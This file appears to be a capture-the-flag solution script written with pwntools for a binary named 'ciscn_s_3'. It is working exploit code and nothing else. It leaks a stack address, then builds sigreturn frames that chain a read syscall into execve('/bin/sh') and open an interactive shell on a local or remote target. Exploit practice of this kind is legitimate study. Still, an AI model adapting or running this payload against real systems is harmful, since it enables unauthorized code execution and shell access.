from pwn import *
context(os="linux", arch="amd64")

def debug_on():
	if args.DEBUG:
		context.log_level = "debug"

g_fname = "./ciscn_s_3"
if args.REMOTE:
	g_io = remote(args.HOST, int(args.PORT))
else:
	g_io = process(g_fname)

def pwn():
	sys_ret_addr = 0x400517 # syscall; ret
	rax_15_addr = 0x4004DA # mov rax, 15
	vul_addr = 0x4004F1 
	binsh_str = "/bin/sh\0".ljust(0x10, '\0')
	g_io.send(flat(binsh_str, vul_addr))
	g_io.recv(0x20)
	stack_addr = u64(g_io.recv(8))
	binsh_addr = (stack_addr - 0x1000) & (2**64 - 0x10)
	log.success("stack_addr=%#x\n", stack_addr)

	# construct sys_read(0, binsh_addr, 0x400)
	sf = SigreturnFrame()
	sf.rax = int(constants.SYS_read)
	sf.rdi = 0
	sf.rsi = binsh_addr # where "/bin/sh" locates.
	sf.rdx = 0x400
	sf.rip = sys_ret_addr
	sf.rsp = binsh_addr + 0x200
	
	payload_read = flat(['a'*16, rax_15_addr, sys_ret_addr, sf])
	pause()
	g_io.send(payload_read)

	# construct sys_execve("/bin/sh", 0, 0)
	sf = SigreturnFrame()
	sf.rax = int(constants.SYS_execve)
	sf.rdi = binsh_addr
	sf.rip = sys_ret_addr
	sf.rsp = stack_addr # Anywhere is ok.
	payload_exec = flat([binsh_str.ljust(0x200), rax_15_addr, sys_ret_addr, sf])
	pause()	
	g_io.send(payload_exec)
	
if "__main__" == __name__:
	debug_on()
	pwn()
	g_io.interactive()
	
